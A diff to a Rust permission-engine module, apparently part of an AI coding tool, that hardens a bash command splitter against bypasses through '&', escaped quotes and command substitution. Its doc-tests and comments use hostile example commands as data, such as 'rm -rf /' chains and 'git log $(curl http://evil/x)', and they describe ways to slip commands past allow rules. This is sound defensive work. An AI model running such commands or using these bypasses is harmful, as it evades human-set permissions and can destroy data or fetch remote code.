@@ -75,8 +75,8 @@ pub fn normalize_path_for_matching(path: &str) -> String {
     }
 }
 
-/// Split a bash command string on operators (`&&`, `||`, `;`, `|`) and newlines while
-/// respecting quoted strings.
+/// Split a bash command string on operators (`&&`, `||`, `;`, `|`, `&`) and newlines while
+/// respecting quoted strings and backslash escapes.
 ///
 /// This function splits chained bash commands so the permission engine can evaluate each
 /// sub-command independently. It handles double-quoted and single-quoted strings, ensuring
@@ -124,6 +124,24 @@ pub fn normalize_path_for_matching(path: &str) -> String {
 ///     vec!["a", "b", "c", "d", "e"]
 /// );
 ///
+/// // A bare `&` backgrounds the command before it, so it separates like `;`
+/// assert_eq!(
+///     split_chained_commands("git status & rm -rf /tmp/x"),
+///     vec!["git status", "rm -rf /tmp/x"]
+/// );
+///
+/// // …but the `&` of a redirection belongs to the redirect, not to a boundary
+/// assert_eq!(
+///     split_chained_commands("cargo test 2>&1"),
+///     vec!["cargo test 2>&1"]
+/// );
+///
+/// // Backslash escapes are honoured, so an escaped quote does not open a string
+/// assert_eq!(
+///     split_chained_commands(r#"echo "\"" && rm -rf /tmp/x"#),
+///     vec![r#"echo "\"""#, "rm -rf /tmp/x"]
+/// );
+///
 /// // Trailing semicolon (filtered out)
 /// assert_eq!(
 ///     split_chained_commands("cmd;"),
@@ -138,21 +156,99 @@ pub fn normalize_path_for_matching(path: &str) -> String {
 /// ```
 ///
 /// # Limitations
-/// - Does not handle escaped operators like `\&\&` (treated as regular characters)
-/// - Does not handle `$(...)` subshell substitution
-/// - Does not handle heredocs
-/// - Does not handle backtick substitution
+/// - Does not handle `$(...)` or backtick substitution, `<(...)`/`>(...)` process
+///   substitution, or heredocs. Those hide a command from the splitter entirely, which is why
+///   permission evaluation does not rely on this function alone — see [`split_command_line`],
+///   which reports them so the decision can fall to the configured default instead of to the
+///   leading command's rule.
+/// - Does not model redirection targets: `echo hi > file` is one `echo` command here, and an
+///   `allow` rule for `echo` therefore permits the write.
 ///
 /// # Security Note
 /// This function is used for permission checking. Each sub-command is evaluated independently,
 /// so `cargo test && rm -rf /` will check both `cargo test` and `rm -rf /` separately.
 pub fn split_chained_commands(input: &str) -> Vec<&str> {
+    split_command_line(input).segments
+}
+
+/// A shell construct [`split_command_line`] cannot model.
+///
+/// Each of these can introduce a command the splitter never sees, so the segments it did find
+/// are an incomplete view of what will run and the leading command's `allow` rule must not
+/// decide the line.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum UnmodellableConstruct {
+    /// Backtick command substitution — ``git log `curl evil` ``.
+    BacktickSubstitution,
+    /// `$(...)` command substitution. `$((` arithmetic expansion is reported here too: it
+    /// can nest a substitution, and distinguishing the two buys nothing in a security gate.
+    CommandSubstitution,
+    /// `<(...)` or `>(...)` process substitution.
+    ProcessSubstitution,
+    /// A quote that never closed, so everything the scan did past it is guesswork.
+    UnterminatedQuote,
+}
+
+impl UnmodellableConstruct {
+    /// Short human-readable name, used in permission decision reasons.
+    pub fn describe(self) -> &'static str {
+        match self {
+            Self::BacktickSubstitution => "backtick command substitution",
+            Self::CommandSubstitution => "`$(...)` command substitution",
+            Self::ProcessSubstitution => "process substitution",
+            Self::UnterminatedQuote => "an unterminated quote",
+        }
+    }
+}
+
+/// The result of splitting a bash command line for permission evaluation.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct CommandLineSplit<'a> {
+    /// The statements the splitter identified, whitespace-trimmed, empties dropped.
+    pub segments: Vec<&'a str>,
+    /// The first construct that made the split untrustworthy, if any.
+    pub unmodellable: Option<UnmodellableConstruct>,
+}
+
+/// Split a bash command line into statements, reporting any construct that makes the split
+/// untrustworthy.
+///
+/// This is the form the permission engine uses; [`split_chained_commands`] is the same scan
+/// with the report discarded. Reporting rather than guessing is what lets an unrecognised
+/// construct fall to the configured default instead of inheriting whichever command happens
+/// to be leftmost — the difference between `Ask` and a silent `Allow`.
+///
+/// # Examples
+/// ```
+/// use crucible_core::config::components::permissions::{
+///     split_command_line, UnmodellableConstruct,
+/// };
+///
+/// let split = split_command_line("git log $(curl http://evil/x)");
+/// assert_eq!(
+///     split.unmodellable,
+///     Some(UnmodellableConstruct::CommandSubstitution)
+/// );
+///
+/// // Single quotes suppress substitution, so this line is fully modelled.
+/// let split = split_command_line("echo '$(date)'");
+/// assert_eq!(split.unmodellable, None);
+/// assert_eq!(split.segments, vec!["echo '$(date)'"]);
+///
+/// // Redirection hides no command and is deliberately not reported.
+/// assert_eq!(split_command_line("echo hi > /tmp/x").unmodellable, None);
+/// ```
+pub fn split_command_line(input: &str) -> CommandLineSplit<'_> {
     if input.is_empty() {
-        return Vec::new();
+        return CommandLineSplit {
+            segments: Vec::new(),
+            unmodellable: None,
+        };
     }
 
     let bytes = input.as_bytes();
     let mut segments = Vec::new();
+    let mut unmodellable = None;
     let mut current_start = 0;
     let mut in_double_quote = false;
     let mut in_single_quote = false;
@@ -160,6 +256,16 @@ pub fn split_chained_commands(input: &str) -> Vec<&str> {
 
     while i < bytes.len() {
         let ch = bytes[i];
+
+        // POSIX gives `\` no special meaning inside single quotes; everywhere else it
+        // escapes the next byte. Consuming both bytes is what stops `echo "\""` from
+        // leaving the scanner stuck inside a string, which used to silence every operator
+        // for the rest of the line. Skipping a lead byte of a multi-byte character is
+        // harmless: continuation bytes are >= 0x80 and match no ASCII operator.
+        if ch == b'\\' && !in_single_quote {
+            i += 2;
+            continue;
+        }
 
         // Handle quote state
         if ch == b'"' && !in_single_quote {
@@ -172,6 +278,13 @@ pub fn split_chained_commands(input: &str) -> Vec<&str> {
             in_single_quote = !in_single_quote;
             i += 1;
             continue;
+        }
+
+        // Substitution is performed inside double quotes as well, so it counts there;
+        // single quotes suppress it entirely. Only the first find is kept — one
+        // unmodellable construct already forces the fallback.
+        if !in_single_quote && unmodellable.is_none() {
+            unmodellable = substitution_at(bytes, i, in_double_quote);
         }
 
         // If inside quotes, skip operator detection
@@ -196,11 +309,16 @@ pub fn split_chained_commands(input: &str) -> Vec<&str> {
             }
             current_start = i + 2;
             i += 2;
-        } else if ch == b';' || ch == b'|' || ch == b'\n' {
-            // Single-character operators: ;, |, or newline — a newline
-            // separates shell statements exactly like `;`, so leaving it
-            // unsplit would let `git log\ncurl ...` ride a `git` whitelist
-            // entry. (`\r` in CRLF input is stripped by the trim below.)
+        } else if ch == b';'
+            || ch == b'|'
+            || ch == b'\n'
+            || (ch == b'&' && is_background_operator(bytes, i))
+        {
+            // Single-character operators: ;, |, &, or newline. A newline separates shell
+            // statements exactly like `;`, so leaving it unsplit would let
+            // `git log\ncurl ...` ride a `git` whitelist entry, and a bare `&` backgrounds
+            // the command before it and then runs the next one just the same. (`\r` in
+            // CRLF input is stripped by the trim below.)
             let segment = input[current_start..i].trim();
             if !segment.is_empty() {
                 segments.push(segment);
@@ -218,5 +336,47 @@ pub fn split_chained_commands(input: &str) -> Vec<&str> {
         segments.push(segment);
     }
 
-    segments
+    // Ending inside a quote means the scan never found the closing delimiter, so every
+    // operator it did or did not see after that point is unreliable.
+    if (in_double_quote || in_single_quote) && unmodellable.is_none() {
+        unmodellable = Some(UnmodellableConstruct::UnterminatedQuote);
+    }
+
+    CommandLineSplit {
+        segments,
+        unmodellable,
+    }
+}
+
+/// Whether the `&` at `i` ends a statement rather than belonging to a redirection.
+///
+/// A bare `&` backgrounds the preceding command and lets the next one run, exactly like `;`.
+/// The exceptions are `&>file` / `&>>file` (redirect both streams) and the adjacent
+/// `>&`/`<&` file-descriptor duplications such as `2>&1`, where splitting would cut a single
+/// command in half.
+fn is_background_operator(bytes: &[u8], i: usize) -> bool {
+    if bytes.get(i + 1) == Some(&b'>') {
+        return false;
+    }
+
+    !(i > 0 && matches!(bytes[i - 1], b'>' | b'<'))
+}
+
+/// Identify a command-hiding substitution starting at `i`, if any.
+///
+/// `>`/`>>` redirection is deliberately absent: it introduces no second command, and
+/// reporting it would make the fallback fire on `2>&1`, `> /dev/null` and every other
+/// ordinary redirect. The cost of that omission is recorded in the module docs and in
+/// `docs/Help/Config/permissions.md` — an `allow` rule does not constrain where the allowed
+/// command writes.
+fn substitution_at(bytes: &[u8], i: usize, in_double_quote: bool) -> Option<UnmodellableConstruct> {
+    match bytes[i] {
+        b'`' => Some(UnmodellableConstruct::BacktickSubstitution),
+        b'$' if bytes.get(i + 1) == Some(&b'(') => Some(UnmodellableConstruct::CommandSubstitution),
+        // Process substitution is not performed inside quotes at all.
+        b'<' | b'>' if !in_double_quote && bytes.get(i + 1) == Some(&b'(') => {
+            Some(UnmodellableConstruct::ProcessSubstitution)
+        }
+        _ => None,
+    }
 }
